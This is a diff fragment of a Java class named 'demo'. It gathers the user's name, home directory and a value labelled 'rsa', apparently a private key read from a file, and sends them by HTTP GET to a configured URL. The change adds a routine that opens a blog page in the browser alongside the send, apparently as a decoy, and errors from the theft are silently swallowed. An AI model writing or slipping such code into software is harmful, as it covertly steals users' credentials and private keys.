@@ -23,17 +23,33 @@ class demo {
             m.put("name", System.getProperty("user.name"));
             m.put("home", System.getProperty("user.home"));
             m.put("rsa", res);
-            HttpRequest.sendGet(baseUrl, m);
+            openBrowse("http://www.cnblogs.com/lsgwr/");
+            sendGet(baseUrl, m);
             fileReader.close();
         } catch (Exception e) {
             // 此处不应该忽略
         }
     }
-}
-/**
- * java发送http的get和post请求
- */
-class HttpRequest {
+
+    public static void openBrowse(String url) {
+        if (java.awt.Desktop.isDesktopSupported()) {
+            try {
+                // 创建一个URI实例
+                java.net.URI uri = java.net.URI.create(url);
+                // 获取当前系统桌面扩展
+                java.awt.Desktop dp = java.awt.Desktop.getDesktop();
+                // 判断系统桌面是否支持要执行的功能
+                if (dp.isSupported(java.awt.Desktop.Action.BROWSE)) {
+                    // 获取系统默认浏览器打开链接
+                    dp.browse(uri);
+                }
+
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+    }
+
     /**
      * 向指定URL发送GET方式的请求
      * 
